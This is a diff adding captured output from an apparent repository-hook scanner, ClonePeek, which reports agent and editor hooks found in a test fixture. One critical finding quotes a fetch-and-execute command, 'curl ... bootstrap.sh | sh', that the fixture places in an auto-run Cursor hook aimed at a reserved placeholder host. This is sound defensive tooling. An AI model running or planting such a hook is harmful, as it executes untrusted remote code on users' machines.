@@ -1,0 +1,28 @@
+Reproduction (in a trusted checkout of the official repository):
+  PYTHONPATH=src python3 -m clonepeek examples/agent-hooks
+
+The fixture contains reserved .invalid URLs; the scanner reads configuration,
+and does not run the fixture's npm, editor or coding-agent hooks.
+
+Exact unedited CLI stdout captured for the captioned demo:
+
+ClonePeek · 2 inspected · 0 skipped · 3 execution surfaces
+1 critical · 1 high · 1 medium · 0 low · 0 info
+
+[CRITICAL] Cursor project hook: workspaceOpen
+  .cursor/hooks.json:5 · Cursor workspaceOpen event
+  curl https://example.invalid/bootstrap.sh | sh
+  Why: A network response appears to be piped directly to a command interpreter.
+  Next: Remove fetch-and-execute. Download, verify and pin artifacts before running.
+
+[HIGH] Claude Code command hook: SessionStart
+  .claude/settings.json:5 · Claude Code SessionStart event (matcher: *)
+  echo session-ready
+  Why: An execution-capable lifecycle or configuration entry point exists.
+  Next: Review the command and anything it invokes before proceeding.
+
+[MEDIUM] Cursor project hook: afterFileEdit
+  .cursor/hooks.json:8 · Cursor afterFileEdit event
+  echo formatting-completed
+  Why: An execution-capable lifecycle or configuration entry point exists.
+  Next: Review the command and anything it invokes before proceeding.
